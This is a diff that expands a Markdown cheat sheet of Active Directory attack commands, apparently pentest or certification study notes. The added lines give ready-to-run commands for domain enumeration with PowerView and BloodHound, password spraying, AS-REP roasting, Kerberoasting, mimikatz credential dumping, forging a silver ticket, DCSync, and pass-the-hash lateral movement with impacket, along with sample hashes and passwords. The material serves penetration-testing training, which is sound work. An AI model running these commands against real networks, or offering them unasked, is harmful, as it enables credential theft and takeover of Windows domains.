@@ -46,17 +46,73 @@ net group "Sales Department" /domain
 
 ### Operating System
 
+PowerView:
+```
+Get-NetComputer
+```
+
 ### Permissions and Logged on Users
+
+PowerView:
+```
+Find-LocalAdminAccess
+```
+
+PowerView:
+```
+Get-NetSession -ComputerName computer_name -Verbose
+```
 
 ### Enumeration Through Service Principal Names
 
+cmd:
+```
+setspn -L user
+```
+
+powershell:
+```
+Get-NetUser -SPN | select samaccountname,serviceprincipalname
+```
+
 ### Enumerating Object Permissions
 
+Permissions:
+```
+GenericAll: Full permissions on object
+GenericWrite: Edit certain attributes on the object
+WriteOwner: Change ownership of the object
+WriteDACL: Edit ACE's applied to object
+AllExtendedRights: Change password, reset password, etc.
+ForceChangePassword: Password change for object
+Self (Self-Membership): Add ourselves to for example a group
+```
+
+PowerView:
+```
+Get-ObjectAcl -Identity douglas
+```
+
 ### Enumerating Domain Shares
+
+PowerView:
+```
+Find-DomainShare
+```
 
 ## Automatic
 
 ### BloodHound
+
+Open terminal and type:
+```
+sudo neo4j console
+```
+
+After neo4j has been loaded, use another terminal and type:
+```
+bloodhound
+```
 
 #### Sharphound:
 ```
@@ -65,7 +121,7 @@ Invoke-BloodHound -CollectionMethod All
 
 #### Analyzing Data
 
-#### Raw Queries
+##### Raw Queries
 
 Return Computers:
 ```
@@ -88,28 +144,79 @@ Reference: [Wikipedia](https://en.wikipedia.org/wiki/Kerberos_%28protocol%29)
 
 ## Password Attacks
 
+### Password Spraying
+```
+crackmapexec smb 192.168.10.10 -u users.txt -p 'password123!' -d corp.com --continue-on-success
+```
+
+### Kerbrute
+```
+kerbrute passwordspray -d test.local domain_users.txt password123
+```
+
 ## AS-REP Roasting
+
+### impacket
+```
+impacket-GetNPUsers domain.com/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+```
+
+### Rubeus
+```
+.\Rubeus.exe asreproast /nowrap
+```
 
 ## Kerberoasting
 
+### Rubeus
+```
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+```
+### impacket
+```
+impacket-GetUserSPNs -request -dc-ip 192.168.10.10. domain.com/douglas
+```
+
 ## Silver Tickets
+
+We need to collect three pieces of information:
+- SPN password hash
+- Domain SID
+- Target SPN
+
+Using mimikatz to extract cached AD credentials:
+```
+privilege::debug
+```
+
+```
+sekurlsa::logonpasswords
+```
+From the dump presented from mimikatz, we can get the sid for our admin, the service for the silver ticket and the user
+
+```
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:domain.com /ptt /target:website.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:admin
+```
+
+Now, confirm with `klist` that we have a service ticket
 
 ## Domain Controller Synchronization
 
-With impacket:
+### impacket
 ```
 secretsdump.py domain.com/username@$rhost -just-dc-user Administrator
 ```
 
-with mimikatz:
-
-
+### mimikatz
+```
+lsadump::dcsync /domain:domina.com /user:dcsyncuser
+```
 # Lateral Movement
 
 How to create a PSCredential:
 ```
-$username = 'jen';
-$password = 'Nexus123!';
+$username = 'ken';
+$password = 'password123!';
 $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
 ```
@@ -123,20 +230,35 @@ Checking for WinRM:
 ```
 crackmapexec winrm $ip -u user -p password
 ```
+
 ## PsExec
 The user that authenticates to the target machine needs to be part of the Administrators local group
 The ADMIN$ share must be available and File and Printer Sharing has to be turned on
 
-impacket-psexec
+```
+impacket-psexec test.local/john:password123@10.10.10.1
+```
+
 ## Pass the Hash
+
+### Impacket:
+
+WMI:
+```
+impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@$rhost
+```
+
+PsExec:
+```
+impacket-psexec oscp.exam/administrator@192.168.130.102 -hashes :ba85f4e1f47633ebd44894de679fabb4
+
+```
 
 ## Overpass the Hash
 
 ## Pass the Ticket
 
-## DCOM
-
-# Persistance
+# Persistence
 
 ## Golden Ticket
 
